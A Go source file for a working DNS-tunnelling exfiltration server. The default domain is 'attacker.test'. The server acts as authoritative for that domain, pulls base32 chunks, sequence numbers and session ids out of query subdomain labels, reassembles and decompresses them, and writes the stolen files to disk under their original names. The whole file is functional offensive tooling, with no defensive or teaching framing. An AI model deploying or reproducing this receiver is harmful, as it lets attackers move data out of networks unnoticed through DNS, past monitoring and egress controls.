package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

var (
	domainFlag = flag.String("domain", "attacker.test", "")
	outDir     = flag.String("out", "received", "")
	port       = flag.Int("port", 5300, "")
	maxChunks  = flag.Int("max-chunks", 20000, "")
	maxBytes   = flag.Int("max-bytes", 50<<20, "")
	progressLogEvery = 50
)

type sessionStore struct {
	mu           sync.Mutex
	chunks       map[string]map[int]string
	bytes        map[string]int
	expected     map[string]int
	origFilename map[string]string
}

func newStore() *sessionStore {
	return &sessionStore{
		chunks:       make(map[string]map[int]string),
		bytes:        make(map[string]int),
		expected:     make(map[string]int),
		origFilename: make(map[string]string),
	}
}

func (s *sessionStore) addChunk(session string, seq int, chunk string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.chunks[session] == nil {
		s.chunks[session] = make(map[int]string)
		s.bytes[session] = 0
	}
	// handle meta in seq 0: "meta|<total>|<fnB32>"
	if seq == 0 {
		s.chunks[session][0] = chunk
		parts := strings.SplitN(chunk, "|", 3)
		if len(parts) >= 2 && parts[0] == "meta" {
			if total, err := strconv.Atoi(parts[1]); err == nil {
				s.expected[session] = total
			}
			if len(parts) == 3 && parts[2] != "" {
				if b, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(parts[2])); err == nil {
					s.origFilename[session] = string(b)
				}
			}
		}
		return nil
	}

	if len(s.chunks[session]) >= *maxChunks {
		return fmt.Errorf("max chunks exceeded")
	}
	s.chunks[session][seq] = chunk
	s.bytes[session] += len(chunk)
	// log progress every N chunks
	got := 0
	for k := range s.chunks[session] {
		if k == 0 {
			continue
		}
		got++
	}
	exp := s.expected[session]
	if got%progressLogEvery == 0 || (exp > 0 && got%10 == 0) {
		log.Printf("session %s progress: %d/%d", session, got, exp)
	}

	if s.bytes[session] > *maxBytes {
		delete(s.chunks, session)
		delete(s.bytes, session)
		delete(s.expected, session)
		delete(s.origFilename, session)
		return fmt.Errorf("max bytes exceeded, session dropped")
	}
	return nil
}

func (s *sessionStore) shouldReconstruct(session string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	exp, ok := s.expected[session]
	if !ok || exp <= 0 {
		return false
	}
	got := 0
	if m, ok2 := s.chunks[session]; ok2 {
		for k := range m {
			if k == 0 {
				continue
			}
			got++
		}
	}
	return got >= exp
}

func (s *sessionStore) reconstructAndWrite(session string) (string, error) {
	s.mu.Lock()
	m, ok := s.chunks[session]
	if !ok {
		s.mu.Unlock()
		return "", fmt.Errorf("no session")
	}
	seqs := make([]int, 0, len(m))
	for k := range m {
		seqs = append(seqs, k)
	}
	sort.Ints(seqs)
	parts := make([]string, 0, len(seqs))
	for _, i := range seqs {
		// skip meta label 0 in the joined payload (we don't want the "meta|..." text in base32 stream)
		if i == 0 {
			continue
		}
		parts = append(parts, m[i])
	}
	origName := s.origFilename[session]
	delete(s.chunks, session)
	delete(s.bytes, session)
	delete(s.expected, session)
	delete(s.origFilename, session)
	s.mu.Unlock()

	joined := strings.Join(parts, "")
	decoder := base32.StdEncoding.WithPadding(base32.NoPadding)
	data, err := decoder.DecodeString(strings.ToUpper(joined))
	if err != nil {
		return "", err
	}

	// detect gzip and decompress if present
	if len(data) >= 2 && data[0] == 0x1f && data[1] == 0x8b {
		gr, err := gzip.NewReader(bytes.NewReader(data))
		if err == nil {
			var out bytes.Buffer
			if _, err := io.Copy(&out, gr); err == nil {
				_ = gr.Close()
				data = out.Bytes()
			} else {
				_ = gr.Close()
			}
		}
	}

	if err := os.MkdirAll(*outDir, 0o755); err != nil {
		return "", err
	}
	var name string
	if origName != "" {
		// sanitize session and origName minimally
		safeFn := strings.ReplaceAll(origName, "/", "_")
		name = fmt.Sprintf("%s/%s_%s.bin", *outDir, session, safeFn)
	} else {
		name = fmt.Sprintf("%s/%s_%d.bin", *outDir, session, time.Now().Unix())
	}
	if err := os.WriteFile(name, data, 0o644); err != nil {
		return "", err
	}
	return name, nil
}

func (s *sessionStore) cleanup(session string) {
	s.mu.Lock()
	delete(s.chunks, session)
	delete(s.bytes, session)
	delete(s.expected, session)
	delete(s.origFilename, session)
	s.mu.Unlock()
}

func serveDNS(s *sessionStore, targetDomain string) {
	d := dns.NewServeMux()
	domainFqdn := dns.Fqdn(targetDomain)

	d.HandleFunc(".", func(w dns.ResponseWriter, r *dns.Msg) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.Authoritative = true

		if len(r.Question) == 0 {
			_ = w.WriteMsg(m)
			return
		}

		q := r.Question[0]
		qName := q.Name
		if !strings.HasSuffix(qName, domainFqdn) && qName != domainFqdn {
			m.Rcode = dns.RcodeNameError
			_ = w.WriteMsg(m)
			return
		}

		name := strings.TrimSuffix(qName, ".")
		parts := strings.Split(name, ".")
		domainParts := strings.Split(strings.TrimSuffix(domainFqdn, "."), ".")
		if len(parts) < 3+len(domainParts) {
			m.Rcode = dns.RcodeSuccess
			_ = w.WriteMsg(m)
			return
		}

		sessionIndex := len(parts) - len(domainParts) - 1
		session := parts[sessionIndex]
		seqStr := parts[0]
		chunk := parts[1]

		// handle done/cleanup forms like done.<session>.<domain>
		if strings.HasPrefix(seqStr, "done") || strings.HasPrefix(seqStr, "cleanup") {
			if strings.HasPrefix(seqStr, "done") {
				// try reconstruct (force) even if expected not set or not all arrived
				path, err := s.reconstructAndWrite(session)
				if err != nil {
					log.Printf("reconstruct error for %s: %v", session, err)
				} else {
					log.Printf("session %s reconstructed -> %s", session, path)
				}
			}
			if strings.HasPrefix(seqStr, "cleanup") {
				s.cleanup(session)
				log.Printf("session %s cleaned up", session)
			}
			a := &dns.A{Hdr: dns.RR_Header{Name: qName, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60}, A: net.ParseIP("127.0.0.1")}
			m.Answer = append(m.Answer, a)
			_ = w.WriteMsg(m)
			return
		}

		seq, err := strconv.Atoi(seqStr)
		if err != nil {
			// maybe meta label (we expect meta as seq 0). If seqStr is non-int, ignore.
			_ = w.WriteMsg(m)
			return
		}

		if err := s.addChunk(session, seq, chunk); err != nil {
			log.Printf("addChunk error session=%s seq=%d: %v", session, seq, err)
			s.cleanup(session)
		} else {
			// if meta had been received earlier and expected is satisfied, reconstruct immediately (async)
			if s.shouldReconstruct(session) {
				go func(sess string) {
					path, err := s.reconstructAndWrite(sess)
					if err != nil {
						log.Printf("reconstruct error for %s: %v", sess, err)
					} else {
						log.Printf("session %s reconstructed -> %s", sess, path)
					}
				}(session)
			}
		}

		a := &dns.A{Hdr: dns.RR_Header{Name: qName, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60}, A: net.ParseIP("127.0.0.1")}
		m.Answer = append(m.Answer, a)
		_ = w.WriteMsg(m)
	})

	serverUDP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp", Handler: d}
	serverTCP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "tcp", Handler: d}

	go func() {
		if err := serverUDP.ListenAndServe(); err != nil {
			log.Fatalf("failed udp: %v", err)
		}
	}()
	if err := serverTCP.ListenAndServe(); err != nil {
		log.Fatalf("failed tcp: %v", err)
	}
}

func main() {
	flag.Parse()
	store := newStore()
	log.Printf("listening authoritative for %s on port %d", *domainFlag, *port)
	serveDNS(store, *domainFlag)
}
